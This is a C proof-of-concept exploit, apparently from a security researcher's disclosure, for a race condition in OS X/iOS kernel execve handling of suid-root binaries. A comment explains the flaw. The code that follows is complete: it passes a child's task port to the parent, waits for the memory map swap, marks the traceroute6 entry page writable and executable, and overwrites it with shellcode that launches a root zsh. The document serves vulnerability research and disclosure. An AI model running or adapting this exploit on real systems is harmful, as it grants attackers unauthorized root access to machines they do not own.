// ianbeer

/*
Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS

tl;dr
The code responsible for loading a suid-binary following a call to the execve syscall invalidates
the task port after first swapping the new vm_map into the old task object leaving a short race window
where we can manipulate the memory of the euid(0) process before the old task port is destroyed.

******************

__mac_execve calls exec_activate_image which calls exec_mach_imgact via the image activator table execsw.

If we were called from a regular execve (not after a vfork or via posix_spawn) then this calls load_machfile
with a NULL map argument indicating to load_machfile that it should create a new vm_map for this process:

  if (new_map == VM_MAP_NULL) {
    create_map = TRUE;
    old_task = current_task();
  }

it then creates a new pmap and wraps that in a vm_map, but doesn't yet assign it to the task:

    pmap = pmap_create(get_task_ledger(ledger_task),
           (vm_map_size_t) 0,
           ((imgp->ip_flags & IMGPF_IS_64BIT) != 0));
    pal_switch_pmap(thread, pmap, imgp->ip_flags & IMGPF_IS_64BIT);
    map = vm_map_create(pmap,
        0,
        vm_compute_max_offset(((imgp->ip_flags & IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),
        TRUE)

the code then goes ahead and does the actual load of the binary into that vm_map:

  lret = parse_machfile(vp, map, thread, header, file_offset, macho_size,
                        0, (int64_t)aslr_offset, (int64_t)dyld_aslr_offset, result);

if the load was successful then that new map will we swapped with the task's current map so that the task now has the
vm for the new binary:

    old_map = swap_task_map(old_task, thread, map, !spawn);

    vm_map_t
    swap_task_map(task_t task, thread_t thread, vm_map_t map, boolean_t doswitch)
    {
      vm_map_t old_map;

      if (task != thread->task)
        panic("swap_task_map");

      task_lock(task);
      mp_disable_preemption();
      old_map = task->map;
      thread->map = task->map = map;

we then return from load_machfile back to exec_mach_imgact:

  lret = load_machfile(imgp, mach_header, thread, map, &load_result);

  if (lret != LOAD_SUCCESS) {
    error = load_return_to_errno(lret);
    goto badtoolate;
  }
  
  ...

  error = exec_handle_sugid(imgp);

after dealing with stuff like CLOEXEC fds we call exec_handle_sugid.
If this is indeed an exec of a suid binary then we reach here before actually setting
the euid:

       * Have mach reset the task and thread ports.
       * We don't want anyone who had the ports before
       * a setuid exec to be able to access/control the
       * task/thread after.
      ipc_task_reset(p->task);
      ipc_thread_reset((imgp->ip_new_thread != NULL) ?
           imgp->ip_new_thread : current_thread());

As this comment points out, it probably is quite a good idea to reset the thread, task and exception ports, and
that's exactly what they do:

  ...
  ipc_port_dealloc_kernel(old_kport);
  etc for the ports
  ...


The problem is that between the call to swap_task_map and ipc_port_dealloc_kernel the old task port is still valid, even though the task isn't running.
This means that we can use the mach_vm_* API's to manipulate the task's new vm_map in the interval between those two calls. This window is long enough
for us to easily find the load address of the suid-root binary, change its page protections and overwrite its code with shellcode.

This PoC demonstrates this issue by targetting the /usr/sbin/traceroute6 binary which is suid-root. Everything is tested on OS X El Capitan 10.11.2.

In our parent process we register a port with launchd and fork a child. This child sends us back its task port, and once we ack that we've got
its task port it execve's the suid-root binary.

In the parent process we use mach_vm_region to work out when the task's map gets switched, which also convieniently tells us the target binary's load
address. We then mach_vm_protect the page containing the binary entrypoint to be rwx and use mach_vm_write to overwrite it with some shellcode which
execve's /bin/zsh (because bash drops privs) try running id in the shell and note your euid.

Everything is quite hardcoded for the exact version of traceroute6 on 10.11.2 but it would be easy to make this into a very universal priv-esc :)

Note that the race window is still quite tight so you may have to try a few times.
*/

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>

#include <servers/bootstrap.h>

#include <stdio.h>
#include <stdlib.h>

#include <unistd.h>

// execve("/bin/zsh", {"/bin/sh", 0}, 0); // honest!
char shellcode[] = "\xe8\x09\x00\x00\x00\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x5f\x48"
                   "\x31\xdb\x53\x57\x48\x89\xe6\x48\x31\xd2\xb8\x3b\x00\x00\x02\x0f"
                   "\x05";

char* service_name = "task_deposit_service";
char* suid_binary_path = "/usr/sbin/traceroute6";

typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} task_msg_send_t;

typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} task_msg_recv_t;

typedef struct {
  mach_msg_header_t header;
} ack_msg_send_t;

typedef struct {
  mach_msg_header_t header;
  mach_msg_trailer_t trailer;
} ack_msg_recv_t;

void do_parent(mach_port_t service_port) {
  kern_return_t err;

  // generate the page we want to write into the child:
  mach_vm_address_t addr = 0;
  err = mach_vm_allocate(mach_task_self(),
                         &addr,
                         4096,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    mach_error("failed to mach_vm_allocate memory", err);
    return;
  }

  FILE* f = fopen(suid_binary_path, "r");
  fseek(f, 0x1000, SEEK_SET);

  fread((char*)addr, 0x1000, 1, f);
  fclose(f);
  
  memcpy(((char*)addr)+0x53c, shellcode, sizeof(shellcode));

  // wait to get the child's task port on the service port:
  task_msg_recv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 service_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    mach_error("error receiving service message", err);
    return;
  }
  
  mach_port_t target_task_port = msg.port.name;
  
  // before we ack the task port message to signal that the other process should execve the suid
  // binary get the lowest mapped address:
  struct vm_region_basic_info_64 region;
  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
  
  mach_vm_size_t target_first_size = 0x1000;
  mach_vm_address_t original_first_addr = 0x0;

  err = mach_vm_region(target_task_port,
                       &original_first_addr,
                       &target_first_size,
                       VM_REGION_BASIC_INFO_64,
                       (vm_region_info_t)&region,
                       &region_count,
                       &object_name);

  if (err != KERN_SUCCESS) {
    mach_error("unable to get first mach_vm_region for target process\n", err);
    return;
  }

  printf("[+] looks like the target processes lowest mapping is at %zx prior to execve\n", original_first_addr);

  // send an ack message to the reply port indicating that we have the thread port
  ack_msg_send_t ack = {0};

  mach_msg_type_name_t reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);

  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, 0);
  ack.header.msgh_size = sizeof(ack);
  ack.header.msgh_local_port = MACH_PORT_NULL;
  ack.header.msgh_remote_port = msg.header.msgh_remote_port;
  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, 0); // use the same rights we got
 
  err = mach_msg_send(&ack.header);
  if (err != KERN_SUCCESS) {
    mach_error("parent failed sending ack", err);
    return;
  }

  mach_vm_address_t target_first_addr = 0x0;
  for (;;) {
    // wait until we see that the map has been swapped and the binary is loaded into it:
    region_count = VM_REGION_BASIC_INFO_COUNT_64;
    object_name = MACH_PORT_NULL; /* unused */
    target_first_size = 0x1000;
    target_first_addr = 0x0;

    err = mach_vm_region(target_task_port,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);

    if (target_first_addr != original_first_addr && target_first_addr < 0x200000000) {
      // the first address has changed implying that the map was swapped
      // let's try to win the race
      break;
    }

  }

  mach_vm_address_t target_addr = target_first_addr + 0x1000;
  mach_msg_type_number_t target_size = 0x1000;
  mach_vm_protect(target_task_port, target_addr, target_size, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
  mach_vm_write(target_task_port, target_addr, addr, target_size);

  printf("hopefully overwrote some code in the target...\n");
  printf("the target first addr changed to %zx\n", target_first_addr);
}

void do_child() {
  kern_return_t err;

  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);

  if (err != KERN_SUCCESS) {
    mach_error("child can't get bootstrap port", err);
    return;
  }

  mach_port_t service_port;
  err = bootstrap_look_up(bootstrap_port, service_name, &service_port);
  
  if (err != KERN_SUCCESS) {
    mach_error("child can't get service port", err);
    return;
  }
  
  // create a reply port:
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  
  if (err != KERN_SUCCESS) {
    mach_error("child unable to allocate reply port", err);
    return;
  }

  // send it our task port
  task_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = service_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
  
  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);

  if (err != KERN_SUCCESS) {
    mach_error("child unable to send thread port message", err);
    return;
  }

  // wait for a reply to ack that the other end got our thread port
  ack_msg_recv_t reply = {0};
  err = mach_msg(&reply.header, MACH_RCV_MSG, 0, sizeof(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    mach_error("child unable to receive ack", err);
    return;
  }

  // exec the suid-root binary
  char* argv[] = {suid_binary_path, "-w", "rofl", NULL};
  char* envp[] = {NULL};
  execve(suid_binary_path, argv, envp);
}


int main() {
  kern_return_t err;

  // register a name with launchd
  mach_port_t bootstrap_port;
  err = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);

  if (err != KERN_SUCCESS) {
    mach_error("can't get bootstrap port", err);
    return 1;
  }

  mach_port_t service_port;
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &service_port);
  
  if (err != KERN_SUCCESS) {
    mach_error("can't allocate service port", err);
    return 1;
  }

  err = mach_port_insert_right(mach_task_self(),
                               service_port,
                               service_port,
                               MACH_MSG_TYPE_MAKE_SEND);
  
  if (err != KERN_SUCCESS) {
    mach_error("can't insert make send right", err);
    return 1;
  }

  err = bootstrap_register(bootstrap_port, service_name, service_port);
  
  if (err != KERN_SUCCESS) {
    mach_error("can't register service port", err);
    return 1;
  }

  printf("[+] registered service \"%s\" with launchd to receive child thread port\n", service_name);

  // fork a child
  pid_t child_pid = fork();
  if (child_pid == 0) {
    do_child();
  } else {
    do_parent(service_port);
    int status;
    wait(&status);
  }

  return 0;
}

